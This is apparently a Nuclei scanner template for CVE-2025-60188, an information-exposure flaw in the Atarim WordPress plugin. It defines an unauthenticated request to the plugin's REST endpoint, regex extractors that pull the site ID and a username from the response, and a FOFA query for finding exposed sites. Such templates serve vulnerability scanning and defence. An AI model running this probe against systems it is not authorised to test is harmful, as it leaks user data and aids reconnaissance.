id: CVE-2025-60188

info:
  name: Atarim < 4.2.2 - Sensitive Information Exposure
  author: m4hs_wacker
  severity: high
  description: |
    Vito Peleg Atarim <= 4.2 contains an insertion of sensitive information into sent data vulnerability caused by improper handling of embedded sensitive data, letting attackers retrieve embedded sensitive data remotely, exploit requires no special privileges.
  impact: |
    Attackers can retrieve embedded sensitive data, potentially leading to information disclosure.
  remediation: |
    Update to the latest version beyond 4.2.
  reference:
    - https://github.com/m4sh-wacker/CVE-2025-60188-Atarim-Plugin-Exploit
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="atarim"
  tags: cve,cve2025,wordpress,wp-plugin,atarim,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/atarim/v1/db/vc"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"wpf_site_id":"'
          - '"notify_user":'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: site_id
        part: body
        group: 1
        regex:
          - '"wpf_site_id":"([0-9]+)"'
        internal: true


      - type: regex
        name: username
        part: body
        group: 1
        regex:
          - '\\?"username\\?":\\?"([^"\\]+)'
        internal: true

      - type: dsl
        dsl:
          - '"username: "+ username'
          - '"Site_ID: "+ site_id'
# digest: 4b0a00483046022100c9b4cb702628337736f8f4b514a6ff14e99c0d0c1333854ff8740e083cde9efb022100b253febc40c99f328ae59cdc23ceb91d756598aba430149126703c9e75865b3c:922c64590222798bb761d5b6d8e72950